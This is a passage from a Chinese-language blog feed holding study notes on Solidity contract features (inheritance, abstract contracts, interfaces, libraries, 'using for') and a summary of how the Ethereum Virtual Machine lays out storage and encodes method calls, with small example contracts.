中使用的顺序相反。可以这么分析，当调用在不同合约中多次定义的函数时，以深度优先的方式从右到左搜索给定的基，在第一次匹配时停止。如果一个基合约已经被搜索过了则跳过。</p><p>当继承层次结构中有多个构造函数时，构造函数将始终以线性化顺序执行，无论继承合约的构造函数中提供它们的参数的顺序如何。从线性化顺序的 “most base-like” 合约的构造函数开始，执行到 “most derived” 合约的构造函数。</p><p>如果合约中任何函数或修饰符或事件由于继承而具有相同的名称，则为错误。一个例外是，状态变量获取函数可以覆盖外部函数。</p><h3 id="Abstract-Contracts"><a href="#Abstract-Contracts" class="headerlink" title="Abstract Contracts"></a>Abstract Contracts</h3><p>如果一个合约中至少有一个函数没有实现或没有为其所有的基合约构造函数提供参数时，合约必须标记为 <code>abstract</code>（自身或其基合约信息不完整）。即使不是这种情况，合约仍有可能被标记为 <code>abstract</code>，比如不打算直接创建合约时。抽象合约类似于接口，但接口在其可以声明的部分有更多的限制。</p><p>抽象合约不能直接实例化。如果抽象合约本身确实实现了所有的函数，这也是正确的。如果合约继承自抽象合约，并且没有通过覆盖(override)实现所有未实现的功能，则也需要将其标记为 <code>abstract</code>。没有实现的函数与函数类型并不相同，尽管语法看起来非常相似。没有实现的函数示例（函数声明）：<code>function foo(address) external returns (address);</code>；作为函数类型的变量的声明示例：<code>function(address) external returns (address) foo;</code>。</p><p>抽象合约将合约的定义与其实现分离，提供更好的可扩展性和自文档化，并促进  <a href="https://en.wikipedia.org/wiki/Template_method_pattern">Template method</a> 等模式和消除代码重复。抽象合约的用处与在接口中定义方法的用处相同。这是抽象合约的设计者说的 “any child of mine must implement this method” 的一种方式。抽象合约不能用未实现的 <code>virtual</code> 函数覆盖已实现的 <code>virtual</code> 函数。</p><h3 id="Interfaces"><a href="#Interfaces" class="headerlink" title="Interfaces"></a>Interfaces</h3><p>接口和抽象合约相似，但它们不能有任何实现了的函数，以及更多的限制：</p><ul><li>接口不能继承自其他合约，但可以继承自其他接口；</li><li>接口中所有声明的函数必须是外部的(external)，即使它们在合约中是公共的；</li><li>接口不能声明构造函数；</li><li>接口不能声明状态变量；</li><li>接口不能声明修饰符。</li></ul><p>接口基本上仅限于合约 ABI 所能表示的内容，ABI 和接口之间的转换应该是可以没有任何信息丢失地实现的。接口使用 <code>interface</code> 关键字标识。</p><p>合约可以像继承其它合约一样继承接口。接口可以从其它接口继承。这与普通继承具有相同的规则。</p><p>接口中声明的所有函数都是隐式 <code>virtual</code>，任何覆盖它们的函数都不需要 <code>override</code> 关键字。这并不意味着覆盖函数可以再次被覆盖，只有覆盖函数被标记为 <code>virtual</code> 时才可以。</p><p>在接口和其它类似合约的结构中定义的类型可以从其它合约访问，比如 <code>Token.TokenType</code> 或 <code>Token.Coin</code>。</p><h3 id="Libraries"><a href="#Libraries" class="headerlink" title="Libraries"></a>Libraries</h3><p>库和合约相似，但它们的目的是它们仅在特定地址部署一次，并且它们的代码可以使用 EVM 的 <code>DELEGATECALL</code> 特性重用。这意味着如果库函数被调用，它们的代码在调用合约的上下文中被执行。因为库是一个隔离的源代码片段，它只可以访问调用合约的状态变量，如果它们被显式提供的话。如果库函数没有改变状态，则它们只能被直接调用（不使用 <code>DELEGATECALL</code>），因为库假设是无状态的。尤其是，不能销毁(destroy)一个库。</p><p>可以在定义&#x2F;不定义数据结构的情况下使用它们。函数也可以在没有任何存储引用参数的情况下工作，并且它们可以有多个存储引用参数并且可以在任何位置。<a href="https://docs.soliditylang.org/en/latest/contracts.html#libraries">Contracts — Libraries</a> 给出了库的使用示例。</p><p>可以通过将库类型转换为 <code>address</code> 类型来获取库的地址，例如使用 <code>address(LibraryName)</code>。</p><p>由于编译器不知道库的部署地址，因此编译后的十六进制代码将包含 <code>__$30bbc0abd4d6364515865950d3e0d10953$__</code> 形式的占位符。占位符是完全限定库名称的 keccak256 哈希的十六进制编码的 34 个字符前缀，例如，如果库存储在 <code>libraries/</code> 目录下的名为 <code>bigint.sol</code> 的文件中，则为 <code>libraries/bigint.sol:BigInt</code>。此字节码不完整，不应部署。占位符需要替换为实际地址。你可以通过在编译库时将它们传递给编译器或使用链接器更新已编译的二进制文件来做到这一点。</p><p>与合约相比，库在以下方面受到限制：</p><ul><li>不能有状态变量；</li><li>不能继承也不能被继承；</li><li>无法接收以太币；</li><li>不能会销毁。</li></ul><p>虽然对公共或外部库函数的外部调用是可能的，但此类调用的调用约定被认为是 Solidity 内部的，与为常规合约 ABI 指定的不同。外部库函数支持比外部合约函数更多的参数类型，例如递归结构和存储指针。出于这个原因，用于计算 4 字节选择器的函数签名是按照内部命名模式计算的，并且合约 ABI 中不支持的类型的参数使用内部编码。</p><p>以下标识符用于签名中的类型：</p><ul><li>值类型，非存储 <code>string</code> 和非存储 <code>bytes</code> 使用与合约 ABI 中相同的标识符。</li><li>非存储数组类型遵循与合约 ABI 中相同的约定，即 <code>&lt;type&gt;[]</code> 用于动态数组，<code>&lt;type&gt;[M]</code> 用于 <code>M</code> 元素的固定大小数组。</li><li>非存储结构体由它们的完全限定名称引用，即 <code>contract C &#123; struct S &#123; ... &#125; &#125;</code> 的 <code>C.S</code>。</li><li>存储指针映射使用 <code>mapping(&lt;keyType&gt; =&gt; &lt;valueType&gt;) storage</code>，其中 <code>&lt;keyType&gt;</code> 和 <code>&lt;valueType&gt;</code> 分别是映射的键和值类型的标识符。</li><li>其他存储指针类型使用其对应的非存储类型的类型标识符，但会附加一个空格，然后是 <code>storage</code>。</li></ul><p>参数编码与常规合约 ABI 相同，除了存储指针，它们被编码为 <code>uint256</code> 值，指的是它们指向的存储槽。与合约 ABI 类似，选择器由签名的 Keccak256-hash 的前四个字节组成。它的值可以使用 <code>.selector</code> 成员从 Solidity 中获取。</p><p>如果使用 <code>CALL</code> 而不是 <code>DELEGATECALL</code> 或 <code>CALLCODE</code>，除非是调用 <code>view</code> 或 <code>pure</code> 函数，否则它将回滚。</p><p>EVM 没有为合约提供直接的方法来检测它是否使用 <code>CALL</code> 调用，但合约可以使用 <code>ADDRESS</code> 操作码来找出它当前运行的“位置”。生成的代码将此地址与构建时使用的地址进行比较，以确定调用方式。</p><p>更具体地说，库的运行时代码总是以 push 指令开始，它在编译时是 20 字节的零。当部署代码运行时，这个常量在内存中被当前地址替换，修改后的代码存储在合约中。在运行时，这会导致部署时间地址成为第一个被压入堆栈的常量，并且调度程序代码将当前地址与任何非视图和非纯函数的该常量进行比较。</p><p>这意味着存储在链上的库的实际代码与编译器报告为 <code>deployBytecode</code> 的代码不同。</p><h3 id="Using-For"><a href="#Using-For" class="headerlink" title="Using For"></a>Using For</h3><p><code>using A for B;</code> 指示可以用于将函数（<code>A</code>）作为成员函数附加到类型（<code>B</code>）。这些函数将接收它们被调用的对象作为它们的第一个参数（就像 Python 的 <code>self</code> 变量）。</p><p>它在文件级别或合约内部的合约级别有效。</p><p>第一部分的 <code>A</code> 可以是以下之一：</p><ul><li>文件级或库函数列表（<code>using &#123;f, g, h, L.t&#125; for uint;</code>） - 只有这些函数会被附加到类型。</li><li>库的名称（<code>using L for uint;</code>）- 库的所有函数（公共的和内部的）都附加到类型。</li></ul><p>在文件级别，第二部分 <code>B</code> 必须是显式类型（没有数据位置说明符）。在合约内部，您还可以使用 <code>using L for *;</code>，其效果是库 <code>L</code> 的所有函数都附加到所有类型。</p><p>如果指定库，则库中的所有函数都会附加，即使是第一个参数的类型与对象类型不匹配的函数。在调用函数并执行函数重载解析时检查类型。</p><p>如果使用函数列表（<code>using &#123;f, g, h, L.t&#125; for uint;</code>），则类型 (<code>uint</code>) 必须隐式转换为每个函数的第一个参数。即使没有调用这些函数，也会执行此检查。</p><p><code>using A for B;</code> 指令仅在当前范围内（合约或当前模块&#x2F;源单元）有效，包括其所有功能，并且在使用它的合约或模块之外无效。</p><p>当该指令在文件级使用，并应用于同一文件中在文件级定义的用户定义类型时，可以在末尾添加单词 <code>global</code>。这将使得函数被附加到任何可以使用该类型的地方(包括其他文件)，而不仅仅是在 using 语句的作用域中。</p><p>使用示例可以从 <a href="https://docs.soliditylang.org/en/latest/contracts.html#using-for">Contracts — Using For</a> 了解。注意，所有外部库调用都是实际的 EVM 函数调用。这意味着，如果传递内存或值类型，将执行复制，即使是 <code>self</code> 变量也是如此。不执行复制的唯一情况是使用存储引用变量或调用内部库函数时。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Solidity-文档-0-8-17-笔记&quot;&gt;&lt;a href=&quot;#Solidity-文档-0-8-17-笔记&quot; class=&quot;headerlink&quot; title=&quot;Solidity 文档 0.8.17 笔记&quot;&gt;&lt;/a&gt;Solidity 文档 0.8.17 笔记&lt;/</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 总结</title>
    <link href="https://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary/"/>
    <id>https://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary/</id>
    <published>2022-10-17T04:01:18.000Z</published>
    <updated>2022-10-17T04:11:23.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-总结"><a href="#深入以太坊虚拟机-总结" class="headerlink" title="深入以太坊虚拟机 总结"></a>深入以太坊虚拟机 总结</h1><blockquote><p>本文是 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum Virtual Machine</a> 系列文章的总结篇，更加简洁地给出了该系列文章的知识要点。您也可以在 Other Parts 部分查看每篇文章的译稿。</p></blockquote><h2 id="1-汇编与字节码"><a href="#1-汇编与字节码" class="headerlink" title="1. 汇编与字节码"></a>1. 汇编与字节码</h2><p>智能合约在编译后的汇编代码中有一半都是样板(boilerplate)。另一半则是完成独有功能的汇编操作码指令。你可以从<a href="https://ethereum.github.io/yellowpaper/paper.pdf">以太坊黄皮书</a>(第30页左右的位置)了解所有的操作码。EVM 基本上是一个循环，从上到下地执行每条指令。比如 EVM 对 <code>6001600081905550</code> 所做的基本上是：<code>sstore(0x0, 0x1)</code>，即把值 <code>0x1</code> 放在 <code>0x0</code> 的存储位置。</p><p>EVM 是一个 256 位的堆栈机器（stack machine），指令可能使用堆栈上的值作为参数，并将值作为结果压入堆栈。在汇编代码中，单独的数值比如 <code>0x1</code> 实际上是 <code>push(0x1)</code> 的简写，表示将值 push 到堆栈顶端。</p><p>以太坊的存储中，每个存储槽(storage slot)可以存储 32 个字节。因此 EVM 以 32 字节为单位处理数据是最自然的做法。如果可能，Solidity 通过将更小的数据类型打包(pack)到一个存储槽中来优化存储效率。打包的原因是目前为止最昂贵的操作是存储相关的操作：<code>sstore</code> 首次写入和后续写入、以及 <code>sload</code> 需要花费几百至几千 gas，而大多数指令只花费 3~10 gas。<a href="https://ethereum.org/en/developers/docs/evm/opcodes/">Opcodes for the EVM</a> 和 <a href="https://github.com/wolflo/evm-opcodes/blob/main/gas.md">Appendix - Dynamic Gas Costs</a> 给出了所有操作码需要消耗的 gas 开销。</p><p>可以在编译时通过打开 <code>optimize</code> 标志让 Solidity 进行优化：<code>solc --bin --asm --optimize xx.sol</code>。编译器在打包时会通过一些位操作来尽量减少存储相关指令的使用，从而节省 gas 费。</p><p>交易中每个零字节数据或代码需要支付 4 gas，每个非零字节数据需要 68 gas。你可能会在编译生成的字节码中看到很长的 0，其实使用短的字节码也有可能达到同样的效果，但由于字节码普遍非零，因此不一定更省 gas。</p><h2 id="2-固定长度数据类型的表示"><a href="#2-固定长度数据类型的表示" class="headerlink" title="2. 固定长度数据类型的表示"></a>2. 固定长度数据类型的表示</h2><p>在 EVM 语言中，了解数据类型的低级别表示非常重要，因为访问存储非常昂贵。<code>sstore</code> 比基本算术指令贵约 5000 倍，<code>sload</code> 比基本算数指令贵约 100 倍。因此运行和使用合约的成本很可能由 <code>sstore</code> 和 <code>sload</code> 主导。</p><p>合约的 EVM 存储就像一个（几乎）无限长的磁带，长度为 2^256（相当于 256 位的寻址空间），磁带的每个插槽(slot)都保存 32 个字节。存储最初是空白的，默认为 0。拥有无限长的磁带不会花费任何费用。存储变量的声明不需要任何费用，因为不需要初始化。Solidity 为声明的存储变量保留了位置，并且只有在其中存储某些内容时才需要支付费用。</p><p>不仅可以在存储中的任何位置写入，还可以立即从任何位置读取。从未初始化的位置读取只会返回 <code>0x0</code>。</p><p>对于结构体来说，在结构体的实例中，字段按照结构体声明的顺序依次排布。同样的，未使用的结构体字段仅保留了位置而不需要支付费用，只有字段存储值的时候才需要支付费用。</p><p>如果声明一个固定长度的数组，由于编译器确切地知道有多少变量，因此可以简单地将数组元素一个一个地放在存储中，仅保留位置而不支付费用，就像存储变量和结构体所做的一样。</p><p>对于类似的代码，定长数组与结构体和状态变量有相同的存储布局（比如都是存储 6 个 uint 类型变量），但生成的汇编代码不同。原因是 Solidity 为数组访问生成边界检查。数组边界检查会使代码更安全，但同时也会干扰编译器优化，从而使固定长度数组的效率远低于存储变量或结构体。</p><p>存储很昂贵，因此一项关键优化是将尽可能多的数据打包到一个 32 字节的存储槽中。比如在构造函数中有 4 个连续的 64 位整数初始化，那么可以直接打包为一个 <code>sstore</code> 命令。但如果分别使用两个函数调用（每个函数调用完成 2 个变量的初始化）来完成构造函数的话，优化就不再有效，此时会使用 2 个 <code>sstore</code>。因为优化器不会跨标签进行优化。（此结论在 Solidity 0.4.13 版本时正确，在 0.8.17 版本中是否已经有更好的解决方案本人还不确定，您可以直接在 <a href="https://docs.soliditylang.org/en/v0.8.17/internals/optimizer.html">The Optimizer</a> 部分查看）</p><p>总结来说，Solidity 会为存储变量一个一个地保留位置，放在存储中。如果可能的话，编译器会将数据紧密打包成 32 字节的块。对于存储变量和结构体字段，打包行为是可行的；但是对于定长数组，很可能会由于边界检查而破坏优化。在编写合约时，进行小型实验并检查程序集以了解编译器是否正确优化可能很有用。</p><h2 id="3-动态数据类型的表示"><a href="#3-动态数据类型的表示" class="headerlink" title="3. 动态数据类型的表示"></a>3. 动态数据类型的表示</h2><p>Solidity 提供的动态类型主要有三个：</p><ul><li>映射：<code>mapping(bytes32 =&gt; uint256)</code>，<code>mapping(address =&gt; string)</code>，等等</li><li>动态数组：<code>uint256[]</code>，<code>address[]</code>，等等</li><li>字节数组，只有两种：<code>string</code>，<code>bytes</code></li></ul><p>动态数组和字节数组只是具有更高级特性的映射。</p><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>可以将 EVM 存储视为一个键值数据库，每个键限制为存储 32 个字节。对于映射类型，实际的实现是先使用 <code>keccak256</code> 哈希函数得到 32 字节的哈希值，然后将值存储在这个 32 字节哈希值对应的位置。</p><p>对于只有一个映射的情况：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> items<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>items<span class="token punctuation">[</span><span class="token number">0xC0FEFE</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在计算 <code>0xC0FEFE</code> 键对应的哈希的时候，需要使用到 <code>items</code> 变量的位置信息，在这个合约中，<code>items</code> 的位置为 <code>0x0</code>（第一个存储变量）。因此要获取值的地址，就分别将键和位置补齐到32字节，然后拼接起来并计算哈希值：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keccak256<span class="token punctuation">(</span>bytes32<span class="token punctuation">(</span>key<span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span>position<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>对于有两个映射的情况：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> itemsA<span class="token punctuation">;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> itemsB<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>itemsA<span class="token punctuation">[</span><span class="token number">0xAAAA</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCCCC</span><span class="token punctuation">;</span>itemsB<span class="token punctuation">[</span><span class="token number">0xBBBB</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDDDD</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里，<code>itemsA</code> 的位置是 <code>0</code>，那么键 <code>0xAAAA</code> 对应的值 <code>0xCCCC</code> 的存储位置就是 <code>keccak256(bytes32(0xAAAA) + bytes32(0)) = 8396...33f3</code>。<code>itemsB</code> 的位置是 <code>1</code>，那么键 <code>0xBBBB</code> 对应的值 <code>0xDDDD</code> 的存储位置就是 <code>keccak256(bytes32(0xBBBB) + bytes32(1)) = 34cb...d395</code>。（<a href="https://emn178.github.io/online-tools/keccak_256.html">在线 Keccak256 计算</a>）</p><p>如果使用的键是变量，就不会在编译的时候预先计算键的地址，而需要使用汇编代码进行哈希计算。<code>mstore</code> 指令在内存中写入 32 个字节（内存读写只需 3 gas）。通过分别将键和位置加载到相邻的内存块中来“连接”键和位置：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>    key <span class="token punctuation">(</span><span class="token number">32</span> bytes<span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">[</span> position <span class="token punctuation">(</span><span class="token number">32</span> bytes<span class="token punctuation">)</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>然后使用 <code>keccak</code> 指令对该内存区域中的数据进行哈希处理。<code>keccak</code> 指令的费用取决于哈希的数量：指令本身需要 30 gas，每处理 32 字节需要 6 gas，因此这里需要 30 + 6 * 2 &#x3D; 42 gas。</p><p>对于以结构体为值的映射来说，结构体值的位置由上面的计算方式得到，值中各个字段依次排布，与结构体部分所描述的方式相同。即对于合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">Tuple</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token builtin">uint256</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> Tuple<span class="token punctuation">)</span> tuples<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">0x1A</span><span class="token punctuation">;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span>tuples<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">0x1C</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>三个字段的地址分别是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tuples<span class="token punctuation">[</span>0x1<span class="token punctuation">]</span>.a: 0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7dtuples<span class="token punctuation">[</span>0x1<span class="token punctuation">]</span>.b: 0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7etuples<span class="token punctuation">[</span>0x1<span class="token punctuation">]</span>.c: 0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>映射不会打包（Mappings don’t pack）。</strong>考虑到映射的设计方式，您为每项支付的最小存储量是 32 字节，即使只存储 1 个字节。如果一个值大于 32 字节，则以 32 字节为增量支付存储费用。</p><h3 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h3><p>对于大多数语言，数组比映射便宜。然而对于 Solidity，数组是更昂贵版本的映射。数组的项将在存储中按顺序排列。但对这些存储槽的每次访问实际上都是在数据库中进行键值查找。访问一个数组元素与访问映射元素没什么不同。</p><p>比如 <code>uint256[]</code> 类型，本质上与 <code>mapping(uint256 =&gt; uint256)</code> 相同，并添加了使其“类似数组”的特性：</p><ul><li><code>length</code> 表示有多少个项；</li><li>边界检查，读取和写入大于长度的索引时抛出错误（error）；</li><li>比映射更复杂的存储打包行为；</li><li>缩小数组时自动清零未使用的存储槽；</li><li>对 <code>bytes</code> 和 <code>string</code> 进行特殊优化，使短数组（小于 31 字节）的存储效率更高。</li></ul><p>对于合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chunks<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xBB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xCC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>chunks</code> 数组的位置(position)在 <code>0x0</code>。在存储中，<code>0x0</code> 位置存储的值是当前数组的长度。而实际存储数组数据的位置通过 <code>keccak256(bytes32(position))</code> 计算得出，在这里也就是从 <code>290d...e563</code> 到 <code>290d...e565</code>（<code>keccak256(bytes32(0)) = 290d...e563</code>）。</p><p>数组优于映射的一个优点是可以使用打包，比如 <code>uint128[]</code> 数组的两个项正好适合两个存储槽（还有一个位置为 0 的存储槽用于存储长度）。</p><h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p><code>bytes</code> 和 <code>string</code> 是分别针对字节(bytes)和字符(characters)进行优化的特殊数组类型。如果数组的长度小于 31 字节，则只使用一个存储槽来存储整个字节数组。比如合约是下面这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">bytes</span> s<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xBB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0xCC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>此时只占用一个存储槽：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">key:   0x0000000000000000000000000000000000000000000000000000000000000000value: 0xaabbcc0000000000000000000000000000000000000000000000000000000006<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>如果数组大于 31 字节，则字节数组类似于 <code>[]byte</code>。此时存储槽 <code>0x0</code> 不再存储数据，而是存储编码的数组长度(<code>encodedLength</code>)，要获得实际长度需要计算：<code>length = (encodedLength - 1) / 2</code>。实际字节存储在  <code>0x290d...e563</code> 的位置，并且依次存储在后面的插槽中。</p><p>数组有成员变量 <code>length</code>，返回数组的长度（定长数组固定，动态数组变化），该成员变量是只读函数，无法主动更改。动态存储数组和 <code>bytes</code>（不包括 <code>string</code>）有成员函数：<code>push()</code>、<code>push(x)</code> 和 <code>pop()</code>。</p><p>字节数组的汇编代码很大。除了正常的边界检查和数组大小调整之外，还需要对长度进行编码&#x2F;解码，并注意在长字节数组和短字节数组之间进行转换。长数组的编码长度总是奇数，短数组则是偶数。汇编代码只需要查看变量位置处的最后一位，零表示偶数（短），一表示奇数（长）。</p><h2 id="4-智能合约外部方法调用"><a href="#4-智能合约外部方法调用" class="headerlink" title="4. 智能合约外部方法调用"></a>4. 智能合约外部方法调用</h2><p>对于合约的外部调用交易，智能合约将交易的数据 <code>data</code> 字段解释为对合约的函数调用。<code>data</code> 字段的前 4 个字节始终是方法选择器(method selector)，其余的数据是 32 字节为单位的方法参数。如果没有参数那么 <code>data</code> 字段就只有 4 个字节。如果参数没有 32 字节长就用 0 补齐。方法选择器是方法签名的 <code>keccak256</code> 哈希。对于一个简单合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> <span class="token keyword">public</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">setAB</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _b<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span>b <span class="token operator">=</span> _b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>函数调用 <code>setAB(1, 2)</code> 的 <code>data</code> 字段为 <code>0x016aa20b00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000002</code>，分别是 <code>setAB(uint256,uint256)</code> 的函数选择器，以及两个 32 字节的参数。</p><p>智能合约可以通过结构化方式处理输入数据来模拟方法调用。合约应用程序二进制接口(ABI)指定了一个通用的编码方案。</p><p>现在看看编译后的合约如何处理原始输入数据以进行方法调用。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token comment">// Note: `payable` makes the assembly a bit simpler</span><span class="token keyword">function</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>此处我们只看比较重要的两部分：</p><ol><li>匹配选择器并跳转到方法。</li><li>加载参数，执行方法，并从方法返回。</li></ol><p>使用伪代码表示汇编代码逻辑：</p><figure><div 